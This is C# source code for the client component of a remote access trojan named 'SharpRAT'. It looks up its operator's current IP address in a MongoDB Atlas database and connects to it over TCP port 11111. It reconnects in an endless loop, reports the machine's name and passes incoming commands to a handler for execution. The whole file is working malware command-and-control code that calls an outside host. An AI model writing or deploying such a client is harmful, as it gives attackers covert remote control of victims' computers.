using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Microsoft.Win32;
using MongoDB.Bson;
using MongoDB.Driver;

namespace Client.Client
{
    public class SocketClient
    {
        public static bool
            bShouldRun = true,
            bNameSent = false;
        private Socket serverSocket;

        public Socket GetServerSocket()
        {
            return serverSocket;
        }
        public static string MongoIp()
        {
            var dbClient = new MongoClient("mongodb+srv://Snutri:<ENTERYOURCODEHERE>@sharprat.t4wds.mongodb.net/SharpRAT?retryWrites=true&w=majority");
            IMongoDatabase db = dbClient.GetDatabase("SharpRAT");
            var connections = db.GetCollection<BsonDocument>("connections");
            var projection = Builders<BsonDocument>.Projection.Include("AdminName").Include("CurrentIp").Exclude("_id");
            var documents = connections.Find(new BsonDocument()).Project(projection).ToList();
            //Debug.WriteLine($"AdminName: {doc.GetValue("AdminName")}\nCurrentIp: {doc.GetValue("CurrentIp")}");
            //Debug.WriteLine($"ip: {doc.GetValue("CurrentIp")}");
            string ip = /*"81.175.148.170";*/($" {documents[0].GetValue("CurrentIp")}");
            //Debug.WriteLine(ip);
            return ip;
        }
        public void ExecuteClient()
        {
            while (bShouldRun)
            {
                try
                {
                    String ip = MongoIp();
                    string trimmed = String.Concat(ip.Where(c => !Char.IsWhiteSpace(c)));
                    //MongoIp();
                    
                    // Connect to server, currently localhost and port 11111.
                    //IPHostEntry ipHost = Dns.GetHostEntry(ip);
                    IPAddress ipAddress = IPAddress.Parse(trimmed);/*ipHost.AddressList[0];*/
                    IPEndPoint localEndPoint = new(ipAddress, 11111);

                    // TCP/IP Socket.
                    serverSocket = new(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    // Connect to server.
                    GetServerSocket().Connect(localEndPoint);

                    if (!bNameSent)
                        bNameSent = CommandHandler.SendName();
                    try
                    {
                        while (GetServerSocket().Connected)
                        {
                            // Data buffer
                            byte[] messageReceived = new byte[1024];
                            int byteRecv = serverSocket.Receive(messageReceived);
                            CommandHandler.ParseData(Encoding.ASCII.GetString(messageReceived, 0, byteRecv));
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }

                    if (!GetServerSocket().Connected)
                        bNameSent = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }
    }
}
